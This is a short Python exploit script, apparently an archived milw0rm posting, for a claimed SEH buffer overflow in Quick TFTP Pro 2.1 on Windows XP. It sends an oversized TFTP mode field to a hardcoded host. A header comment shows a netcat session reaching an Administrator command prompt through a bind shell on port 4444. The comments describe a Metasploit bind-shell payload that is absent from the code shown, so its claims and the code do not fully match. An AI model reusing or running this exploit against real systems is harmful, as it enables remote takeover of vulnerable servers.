#!/usr/bin/python
# Quick TFTP Pro 2.1 SEH Overflow (0day)
# Tested on Windows XP SP2. 
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/quick-tftp-poc.py.txt
#########################################################
# bt ~ # quickftp.py
# [*] Quick TFTP Pro 2.1 SEH Overflow (0day)
# [*] http://www.offensive-security.com
# [*] Sending evil packet, ph33r
# [*] Check port 4444 for bindshell
# bt ~ # nc -v 172.16.167.130 4444
# (UNKNOWN) [172.16.167.130] 4444 (krb524) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Documents and Settings\Administrator>
##########################################################
import socket
import sys

print "[*] Quick TFTP Pro 2.1 SEH Overflow (0day)"
print "[*] http://www.offensive-security.com"

host = '11.11.11.6'
port = 69

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
   print "socket() failed"
   sys.exit(1)

filename = "pwnd"

# windows/shell_bind_tcp - 317 bytes
# http://www.metasploit.com
# EXITFUNC=thread, LPORT=4444


mode = "A" * 1360

muha = "\x00\x02" + filename+ "\0" + mode + "\0" 

print "[*] Sending evil packet, ph33r"
s.sendto(muha, (host, port))
print "[*] Check port 4444 for bindshell"

# milw0rm.com [2008-03-26]
